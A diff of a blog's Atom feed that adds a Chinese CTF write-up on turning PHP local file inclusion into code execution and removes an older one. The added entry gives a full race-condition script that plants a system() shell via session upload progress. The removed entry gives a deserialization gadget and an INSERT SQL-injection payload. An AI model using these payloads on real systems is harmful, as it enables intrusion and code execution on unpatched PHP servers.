@@ -6,10 +6,43 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-11-07T07:58:05.505Z</updated>
+  <updated>2021-11-16T15:48:35.596Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HECTF</title>
+    <link href="http://lll-nnn.github.io/2021/11/16/HECTF/"/>
+    <id>http://lll-nnn.github.io/2021/11/16/HECTF/</id>
+    <published>2021-11-16T15:38:01.000Z</published>
+    <updated>2021-11-16T15:48:35.596Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-string">&#x27;./index.php&#x27;</span>);    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, waittarget = <span class="hljs-string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>session = requests.session()flag = <span class="hljs-string">&#x27;aaaa&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">e: threading.Event</span>):</span>    files = [        (<span class="hljs-string">&#x27;value&#x27;</span>, (<span class="hljs-string">&#x27;load.png&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40960</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>)),    ]    data = &#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;cat /f1aggggggggggggggggggggggg&quot;);?&gt;&#x27;); echo(&#x27;<span class="hljs-subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;    <span class="hljs-comment">#data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;ls /&quot;);?&gt;&#x27;); ?&gt;&#x27;&#x27;&#x27;&#125;</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        requests.post(            target,            data=data,            files=files,            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,        )<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">e: threading.Event</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        response = requests.get(            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>,        )        <span class="hljs-keyword">if</span> flag.encode() <span class="hljs-keyword">in</span> response.content:            e.<span class="hljs-built_in">set</span>()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    futures = []    event = threading.Event()    pool = ThreadPoolExecutor(<span class="hljs-number">15</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):        futures.append(pool.submit(upload, event))    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):        futures.append(pool.submit(write, event))    wait(futures)</code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;LFI-to-RCE&quot;&gt;&lt;a href=&quot;#LFI-to-RCE&quot; class=&quot;headerlink&quot; title=&quot;LFI_to_RCE&quot;&gt;&lt;/a&gt;LFI_to_RCE&lt;/h2&gt;&lt;p&gt;题目：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt;&lt;s</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
+    
+    <category term="session文件包含写shell" scheme="http://lll-nnn.github.io/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99shell/"/>
+    
+  </entry>
   
   <entry>
     <title>Hackergame2021</title>
@@ -582,42 +615,6 @@
     <category term="getshell" scheme="http://lll-nnn.github.io/tags/getshell/"/>
     
     <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>不是文件上传</title>
-    <link href="http://lll-nnn.github.io/2021/05/15/BUU86/"/>
-    <id>http://lll-nnn.github.io/2021/05/15/BUU86/</id>
-    <published>2021-05-14T16:02:50.000Z</published>
-    <updated>2021-05-16T07:37:39.392Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p><p>没有？？</p><p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>主要是<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>然后是sql <code>insert </code> 注入   </p><p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p><p>上传图片，用burp改一下文件名，在<code>show.php</code>得到flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;__--__&quot;&gt;&lt;/a&gt;&lt;code&gt;__--__&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;题目说不是文件上传，看一下&lt;code&gt;www.zip&lt;/code&gt;   &lt;/p&gt;
-&lt;p&gt;没有？？&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
-    
-    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
-    
-    
-    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
-    
-    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
-    
-    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
-    
-    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
-    
-    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
     
   </entry>
   
